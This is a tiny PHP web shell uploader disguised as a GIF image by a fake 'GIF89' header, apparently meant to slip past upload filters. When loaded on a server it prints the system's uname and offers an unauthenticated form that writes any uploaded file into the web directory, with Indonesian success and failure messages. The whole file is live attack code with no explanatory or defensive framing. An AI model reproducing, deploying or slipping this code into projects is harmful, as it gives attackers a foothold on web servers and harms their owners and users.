GIF89GHZ
<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
	else { echo '<b>Upload GAGAL !!!</b><br><br>'; }
}
?>